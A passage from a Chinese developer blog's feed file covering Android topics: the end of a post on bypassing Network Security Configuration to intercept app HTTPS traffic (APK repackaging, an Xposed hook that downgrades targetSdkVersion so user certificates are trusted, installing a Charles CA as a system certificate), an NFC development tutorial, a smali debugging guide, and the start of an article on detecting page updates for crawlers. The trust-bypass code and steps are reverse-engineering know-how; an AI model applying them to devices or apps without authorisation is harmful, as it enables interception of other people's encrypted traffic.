+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">debug-overrides</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"system"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">debug-overrides</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>除此之外，还需要在 AndroidManifest.xml 中引用自定义的网络安全配置</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:networkSecurityConfig</span>=<span class="string">"@xml/network_security_config"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">...</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>上面是 Network Security Configuration 的使用简介，那么如何绕过该功能呢？</p>
+<h4 id="重编译-APK-文件"><a href="#重编译-APK-文件" class="headerlink" title="重编译 APK 文件"></a>重编译 APK 文件</h4><p>如上文介绍，需要将目标 APK 文件反编译，然后修改 XML 配置文件，在 <strong>trust-anchors</strong> 中信任用户导入的证书，之后重新打包即可。</p>
+<h4 id="运行时-Hook"><a href="#运行时-Hook" class="headerlink" title="运行时 Hook"></a>运行时 Hook</h4><p>在某些情况下，第一种方法也许是不可行的。比如说，需要保留目标应用原始的签名文件。这是无法做到的，因为你不可能拿到开发者的原始证书去给重编译后的应用签名。这里就需要用到 Hook 技术，可以在不修改应用代码的前提下修改应用的行为。</p>
+<p>查看 Android 7.1.2_r36 源码，<strong>android.security.net.config.ManifestConfigSource</strong> 类 用于加载和处理网络安全配置 XML 文件的相关信息<br><strong>getConfigSource()</strong> 方法下，如果应用未配置网络信息，它将会加载默认配置</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">NetworkSecurityConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ConfigSource <span class="title">getConfigSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            ConfigSource source;</span><br><span class="line">            <span class="keyword">if</span> (mConfigResourceId != <span class="number">0</span>) &#123;</span><br><span class="line">                ...</span><br><span class="line">                source = <span class="keyword">new</span> XmlConfigSource(mContext, mConfigResourceId, debugBuild,</span><br><span class="line">                    mTargetSdkVersion, mTargetSandboxVesrsion);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ...</span><br><span class="line">                source = <span class="keyword">new</span> DefaultConfigSource(usesCleartextTraffic, mTargetSdkVersion,</span><br><span class="line">                    mTargetSandboxVesrsion);</span><br><span class="line">            &#125;</span><br><span class="line">            mConfigSource = source;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> mConfigSource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>DefaultConfigSource</strong> 类是 <strong>ManifestConfigSource</strong> 类中一个内部类，即上文代码中返回的默认网络配置。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">NetworkSecurityConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultConfigSource</span> <span class="keyword">implements</span> <span class="title">ConfigSource</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DefaultConfigSource</span><span class="params">(<span class="keyword">boolean</span> usesCleartextTraffic, <span class="keyword">int</span> targetSdkVersion,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">int</span> targetSandboxVesrsion)</span> </span>&#123;</span><br><span class="line">            mDefaultConfig = NetworkSecurityConfig.getDefaultBuilder(targetSdkVersion,</span><br><span class="line">                    targetSandboxVesrsion)</span><br><span class="line">                    .setCleartextTrafficPermitted(usesCleartextTraffic)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在其构造方法中，调用了 <strong>android.security.net.config.NetworkSecurityConfig</strong> 类中的 <strong>getDefaultBuilder()</strong> 去构造一个默认配置。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">NetworkSecurityConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Builder <span class="title">getDefaultBuilder</span><span class="params">(<span class="keyword">int</span> targetSdkVersion, <span class="keyword">int</span> targetSandboxVesrsion)</span> </span>&#123;</span><br><span class="line">        Builder builder = <span class="keyword">new</span> Builder()</span><br><span class="line">                .setHstsEnforced(DEFAULT_HSTS_ENFORCED)</span><br><span class="line">                .addCertificatesEntryRef(</span><br><span class="line">                        <span class="keyword">new</span> CertificatesEntryRef(SystemCertificateSource.getInstance(), <span class="keyword">false</span>));</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (targetSdkVersion &lt;= Build.VERSION_CODES.M) &#123;</span><br><span class="line">            builder.addCertificatesEntryRef(</span><br><span class="line">                    <span class="keyword">new</span> CertificatesEntryRef(UserCertificateSource.getInstance(), <span class="keyword">false</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> builder;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，在应用的 <strong>targetSdkVersion</strong> &lt;= M 时（Android 6.0 及以下），有一个 <strong>addCertificatesEntryRef(UserCertificateSource)</strong>，系统将默认信任用户导入的证书。</p>
+<p>那么以 Xposed 为例，Hook <strong>getDefaultBuilder()</strong>，在调用前将第一个参数 <strong>targetSdkVersion</strong> 改为 Android N 以下就可以了。这里给出核心代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initZygote</span><span class="params">(StartupParam startupParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    Class&lt;?&gt; targetClass = findClass(<span class="string">"android.security.net.config.NetworkSecurityConfig"</span>, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (targetClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        XposedBridge.hookAllMethods(targetClass, <span class="string">"getDefaultBuilder"</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                param.args[<span class="number">0</span>] = Build.VERSION_CODES.M;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="添加系统-CA-证书"><a href="#添加系统-CA-证书" class="headerlink" title="添加系统 CA 证书"></a>添加系统 CA 证书</h4><p>在上文中可以发现，应用是会默认信任系统证书的。那么我们也可以将自己的 CA 文件添加至系统。<br>从 Charles 里导出二进制格式证书，但要使 Android 能够识别，还需要做一些转换，我们可以很方便的使用 openssl 工具来做到。</p>
+<p>这里以导出的 cert.cer 证书文件为例。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ openssl x509 -inform DER -subject_hash_old -in cert.cer</span><br></pre></td></tr></table></figure>
+
+<p>执行该命令，并复制输出结果的第一行哈希字符串，后面会用。如下图所示。<br><img src="https://i.loli.net/2019/08/14/hi7UkoMPXbJxRAn.png" alt="snipaste_20190814_191102.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ openssl x509 -inform DER -text -in cert.cer -out 7ef3ba8a.0</span><br></pre></td></tr></table></figure>
+
+<p>以刚才复制的哈希字符串为文件名，.0 结尾，如 <strong>7ef3ba8a.0</strong>，当做输出的文件名。<br>执行后就会输出 7ef3ba8a.0 这个文件。</p>
+<p>复制输出的文件到 Android 上 <strong>/system/etc/security/cacerts/</strong> 这个目录下，644 权限。<br>然后重启手机，你的证书就被添加到系统里了。</p>
+]]></content>
+      <tags>
+        <tag>Android逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android 上的 NFC 开发</title>
+    <url>/2019/10/14/nfc-develop-for-android/</url>
+    <content><![CDATA[<p>根据 Android 官方文档所写，支持 NFC 的 Android 设备有以下三种操作模式：</p>
+<ul>
+<li>读卡器模式：读取和写入 NFC 卡片（公交卡充值）</li>
+<li>仿真卡模式：将设备模拟成一张 NFC 卡片，可以通过其他 NFC 读卡器访问设备模拟的 NFC 卡（饭卡模拟）</li>
+<li>点对点模式：与 NFC 设备或其他支持非接触式射频传输的设备交换数据（Android Beam）<a id="more"></a>
+
+</li>
+</ul>
+<p>不同 NFC 卡片之间的差异也很大，有些只支持一次性写入，有些则可以支持读写操作，还有些 NFC 卡片内部支持加密功能。Android 对 NFC 卡片格式的支持主要为 NFC Forum 定义的 NDEF (NFC Data Exchange Format) 标准。</p>
+<p>支持 NFC 的 Android 设备在设置内打开了 NFC 功能开关，设备就会在屏幕解锁后，在可以支持的范围内扫描 NFC 卡片。如果发现了一个可识别的 NFC 卡片，会通过 <strong>Intent</strong> 打开可以处理 NFC 操作的应用。如果设备中有多个可以处理该 NFC 卡片格式的应用，则会弹出选框由用户选择应使用哪个应用。</p>
+<h3 id="0x1-读卡器模式"><a href="#0x1-读卡器模式" class="headerlink" title="0x1 读卡器模式"></a>0x1 读卡器模式</h3><p>作为一个 NFC 处理应用，第一步先要在 Manifest 中声明自己可以处理 NFC 操作。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- NFC 硬件支持 --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.nfc"</span> <span class="attr">android:required</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- NFC 权限 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.NFC"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- singleTop 确保扫描到新卡片时调用 onNewIntent()</span></span><br><span class="line"><span class="comment">        锁定竖屏防止丢失 Intent 信息 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:launchMode</span>=<span class="string">"singleTop"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:screenOrientation</span>=<span class="string">"portrait"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.nfc.action.NDEF_DISCOVERED"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:mimeType</span>=<span class="string">"text/plain"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据前文所述，Android 会通过 <strong>Intent</strong> 打开可以处理 NFC 操作的应用，所以应用也要添加 <strong>IntentFilter</strong> 来匹配想要过滤的数据类型。</p>
+<p>由于对 NDEF 标准的支持最为完善，所以推荐使用 <strong>ACTION_NDEF_DISCOVERED</strong>；但是 Android 同样也对其他卡片格式有部分支持，可以使用 <strong>ACTION_TECH_DISCOVERED</strong>，使用此 action 需要在 xml 文件夹下指定 <strong>tech-list</strong> 来过滤想要使用的 NFC 技术标准；如果前两种 action 都无法匹配，就需要使用到 <strong>ACTION_TAG_DISCOVERED</strong>，但是此 action 过于笼统，要小心使用。</p>
+<p>在 Manifest 中正确声明之后，当扫描到 NFC 卡片时，系统就会打开处理 NFC 操作的 Activity 了：</p>
+<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line"></span><br><span class="line">    mNfcAdapter = NfcAdapter.getDefaultAdapter(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> intent = Intent(<span class="keyword">this</span>, MainActivity::<span class="class"><span class="keyword">class</span>.<span class="title">java</span>)</span></span><br><span class="line">    <span class="keyword">val</span> requestCode = <span class="number">0</span></span><br><span class="line">    <span class="keyword">val</span> flag = <span class="number">0</span></span><br><span class="line">    mPendingIntent = PendingIntent.getActivity(<span class="keyword">this</span>, requestCode, intent, flag)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onResume</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.onResume()</span><br><span class="line">    mNfcAdapter?.enableForegroundDispatch(<span class="keyword">this</span>, mPendingIntent, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onPause</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.onPause()</span><br><span class="line">    mNfcAdapter?.disableForegroundDispatch(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，在 onResume() 和 onPause() 中分别调用的 NfcAdapter 的两个方法，会使系统在扫描到新的 NFC 卡片时优先使用当前 Activity 进行处理，不再弹出 Intent 选择，以免降低用户的体验。</p>
+<hr>
+<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onNewIntent</span><span class="params">(intent: <span class="type">Intent</span>?)</span></span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.onNewIntent(intent)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> tag: Tag? = intent?.getParcelableExtra(NfcAdapter.EXTRA_TAG)</span><br><span class="line">    println(tag)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 onNewIntent() 中，即可通过 Intent 来获取卡片的信息了，输出：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I/System.out: TAG: Tech [android.nfc.tech.NfcA, android.nfc.tech.MifareClassic, android.nfc.tech.NdefFormatable]</span><br></pre></td></tr></table></figure>
+
+<p>此处使用的是 Tag 格式的卡片实体类来获取，如果已经确定卡片是 NDEF 格式，则可以使用 <strong>NfcAdapter.EXTRA_NDEF_MESSAGES</strong>，来获取一个 NDEF 格式的卡片实体类。</p>
+<p>对于非 NDEF 格式的卡片，就需要使用 Android 提供的其他实体类来进行操作，可以使用 <strong>Tag::getTechList()</strong> 来查看卡片所支持的标准。</p>
+<h3 id="0x2-仿真卡模式"><a href="#0x2-仿真卡模式" class="headerlink" title="0x2 仿真卡模式"></a>0x2 仿真卡模式</h3><p>Android 上对 NFC 卡片的模拟的主要是通过 <strong>HCE(基于主机的卡模拟)</strong> 来实现的 (Android 4.4+)，如果使用安全元件进行卡片模拟，则需要部分安全元件的支持，例如 NFC-SIM 卡。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HCE 支持 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"android.hardware.nfc.hce"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:required</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--仿真卡服务--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:permission</span>=<span class="string">"android.permission.BIND_NFC_SERVICE"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:resource</span>=<span class="string">"@xml/apduservice"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">host-apdu-service</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:requireDeviceUnlock</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aid-group</span> <span class="attr">android:description</span>=<span class="string">"@string/aiddescription"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:category</span>=<span class="string">"other"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aid-filter</span> <span class="attr">android:name</span>=<span class="string">"F0010203040506"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aid-filter</span> <span class="attr">android:name</span>=<span class="string">"F0394148148100"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aid-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">host-apdu-service</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 Manifest 的 Service 声明中，引用到了一个 xml 文件夹下的 apduservice.xml 文件，其中 <strong>android:requireDeviceUnlock=false</strong> 可以让设备在亮屏但不解锁的情况下启动 HCE 服务；<strong>aid-filter</strong> 是必要的，Android 会根据 <strong>aid-filter</strong> 所定义的 <strong>AID</strong> 来选择合适的 HCE 服务，具体的 <strong>AID</strong> 数值参照要模拟的 NFC 卡片为准，须为十六进制格式，并且是偶数位。</p>
+<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CardService</span> : <span class="type">HostApduService</span></span>() &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">processCommandApdu</span><span class="params">(commandApdu: <span class="type">ByteArray</span>, extras: <span class="type">Bundle</span>)</span></span>: ByteArray &#123;</span><br><span class="line">        <span class="keyword">val</span> aid = <span class="string">"F0010203040506"</span></span><br><span class="line">        <span class="keyword">val</span> header = <span class="string">"00A40400"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> selectApdu = (header + String.format(<span class="string">"%02X"</span>, aid.length / <span class="number">2</span>) + aid).toByteArray()</span><br><span class="line">        <span class="keyword">if</span> (selectApdu.contentEquals(commandApdu)) &#123;</span><br><span class="line">            <span class="keyword">return</span> aid.toByteArray()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> byteArrayOf()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onDeactivated</span><span class="params">(reason: <span class="type">Int</span>)</span></span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 <strong>HostApduService::processCommandApdu</strong> 中，设备将作为一张模拟的 NFC 卡片，Android 系统会将其接收到的 APDU 数据传入进来，此方法运行在 UI 线程，需要返回一个 ByteArray 作为响应数据发送回 NFC 读取设备。</p>
+<h3 id="0x3-点对点模式"><a href="#0x3-点对点模式" class="headerlink" title="0x3 点对点模式"></a>0x3 点对点模式</h3><p>NFC 卡片有 <strong>ID</strong> 卡与 <strong>IC</strong> 卡之分。传统的 ID 卡片只有数据存储功能，能轻易的被读写，卡片本身只是记录一个 ID 数值；IC 卡则不同，内部具有微型 CPU，数据的读写会经过卡片的 CPU 进行处理，支持加密功能，更加安全。</p>
+<p>以笔者的卡片为例，卡片所使用的 IC 为 NXP MF1S50，ISO-14443 标准，数据的读写入需要与卡片进行 <strong>APDU(应用协议数据单元)</strong> 交互，具体的指令可以从 IC 的 datasheet 中获得。</p>
+<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> isoDep: IsoDep = IsoDep.<span class="keyword">get</span>(tag)</span><br><span class="line">isoDep.connect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> payload = byteArrayOf(<span class="number">0x93</span>.toByte(), <span class="number">0x70</span>.toByte())  <span class="comment">// SELECT</span></span><br><span class="line"><span class="keyword">val</span> result = isoDep.transceive(payload)</span><br></pre></td></tr></table></figure>
+
+<p>这里使用 <strong>IsoDep::transceive()</strong> 向卡片发送指令，卡片会根据指令返回相应的数据，至于数据如何解析，就要参照不同卡片的技术规范了，可参考《中国金融集成电路 (IC卡) 规范》和《中国银联 IC 卡技术规范》。</p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 Android Studio 动态调试 Smali 代码</title>
+    <url>/2017/09/29/using-as-debug-smali-code/</url>
+    <content><![CDATA[<h3 id="0x1-准备"><a href="#0x1-准备" class="headerlink" title="0x1 准备"></a>0x1 准备</h3><p>一台可以正常运行 Android Studio / IDEA 的电脑<br>一个顺手的 Smali 代码反编译工具<br>smalidea 插件，可从 <a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="noopener">这里</a> 获取，baksmali 工具也有<br>你需要有一个目标 APK 文件，这里我新建的一个测试项目为例</p>
+<h3 id="0x2-开始"><a href="#0x2-开始" class="headerlink" title="0x2 开始"></a>0x2 开始</h3><a id="more"></a>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 方便测试，尽可能多用些中间变量</span></span><br><span class="line">        <span class="keyword">double</span> radius = <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">double</span> square = Math.pow(radius, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">double</span> area = Math.PI * square;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, String.valueOf(area), Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打开 Android Studio，进入 <strong>File -&gt; Settings -&gt; Plugins</strong>，点击 <strong>Install plugin from disk</strong> 按钮，选择并安装 smalidea 插件</p>
+<p>反编译源 apk 文件，生成 out 文件夹，然后从 Android Studio 的 <strong>File -&gt; New -&gt; Import Project</strong>，导入 out 文件夹，记得选择 Source Folder</p>
+<p>成功导入后你就可以发现 Smali 代码的关键字已经可以高亮显示了</p>
+<p>再次打开 Android Studio，点击 <strong>Run -&gt; Edit Configurations</strong>，新建 Remote 类型的调试器，如图<br><img src="https://i.loli.net/2017/09/29/59ce048d5612b.png" alt="snipaste_20170929_162948.png"></p>
+<p>以调试模式在手机端或模拟器运行目标应用</p>
+<blockquote>
+<p>adb shell am start -D -n me.iacn.testapplication/.MainActivity</p>
+</blockquote>
+<p>此时目标应用会在打开时处于挂起状态，然后</p>
+<blockquote>
+<p>adb shell ps</p>
+</blockquote>
+<p>在其中找到以目标应用包名为 NAME 的一个进程，查看他的 PID<br><img src="https://i.loli.net/2017/09/29/59ce0733c6924.png" alt="snipaste_20170929_164110.png"></p>
+<blockquote>
+<p>adb forward tcp:6666 jdwp:5444</p>
+</blockquote>
+<p>其中，forward 为刚才新建 Remote 调试器时所填的本地端口。jdwp 为在上面所查看的目标应用 PID。此种方式实际上是利用 Remote 调试器，通过本地端口 6666 连接手机调试目标应用</p>
+<p>此时回到 Android Studio，下一个断点，然后 <strong>Run -&gt; debug Unnameed</strong>，稍等一会儿，就可以从 Debugger 面板里查看调试结果了<br><img src="https://i.loli.net/2017/09/29/59ce164cd918e.png" alt="snipaste_20170929_174415.png"></p>
+<p>需要注意的是，有时寄存器的值不会直接在 Variables 面板里显示出来，需要将想要查看的变量添加到 Watch 中，然后在 Watch 面板中查看</p>
+]]></content>
+      <tags>
+        <tag>Android逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何判断一个页面是否更新？</title>
+    <url>/2020/05/21/whether-page-is-updated/</url>
+    <content><![CDATA[<p>对于需要长期运行的爬虫程序，在每次爬取前检查目标页面是否更新是十分重要的。如果不进行判断，就会对同一个页面重复爬取多次，浪费时间和性能。</p>
+<a id="more"></a>
+
+<h3 id="定时爬取"><a href="#定时爬取" class="headerlink" title="定时爬取"></a>定时爬取</h3><p>这种方式即为最传统的方式，无论页面是否更新，都会每隔一段时间对页面爬取一次。<br>同时，根据定时方式，又分为在程序内手动轮询计时和使用第三方定时程序两种。</p>
+<p>不推荐使用这种方法，效率低下。一定要用的话也建议使用 crontab 等其他程序定时调用，尽可能的在等待时间内不占用系统资源。</p>
+<hr>
+<h3 id="304-HTTP-状态码"><a href="#304-HTTP-状态码" class="headerlink" title="304 HTTP 状态码"></a>304 HTTP 状态码</h3><p>HTTP 头字段中定义了一个 304 状态码 ( 304 Not Modified )，这个请求头标签原本是供浏览器缓存用的，现代浏览器通常会缓存网页文件在自己的数据目录中，以便下次能更快的加载。</p>
+<p>在浏览器请求页面时，会把本地缓存的网页文件的最后修改时间放在请求头一起发送到服务器。服务器根据这个时间判断，如果页面有更新，会返回 HTTP 状态码 200，正常响应。如果页面没有更新，会返回 HTTP 状态码 304（不返回网页内容，只返回响应头）。</p>
+<p>那么作为爬虫，就可以模拟浏览器的这个行为，在本次爬取后记录爬取的时间，下一次爬取前在请求头中放入 <strong>If-Modified-Since</strong>，把上次爬取的时间一起发送给服务器，然后根据响应的 HTTP 状态码进行下一步操作。</p>
+<p>这种方法看似完美，但是很可惜，因为并不是所有服务器都会遵守规范返回 304 状态码。对于后端渲染的动态页面，或是前端渲染的单页面应用，这种方法也不合适。</p>
+<hr>
+<h3 id="Last-Modified-响应字段"><a href="#Last-Modified-响应字段" class="headerlink" title="Last-Modified 响应字段"></a>Last-Modified 响应字段</h3><p>根据 HTTP 规范，响应头中还有一个 <strong>Last-Modified</strong> 字段来返回页面最后一次的修改时间。<br>将这个时间与上一次爬取的时间做对比即可判断出页面是否更新。</p>
+<p>很可惜，这种方法基本只适用于静态页面。对于动态页面来说，返回的最后修改时间就是发回 Response 的时间，因为动态页面本来就是即时渲染的。</p>
+<hr>
+<h3 id="Etag-响应字段"><a href="#Etag-响应字段" class="headerlink" title="Etag 响应字段"></a>Etag 响应字段</h3><p><strong>Etag</strong> 主要为了解决前两个无法解决的一些问题而被创造出来的，例如：</p>
+<ul>
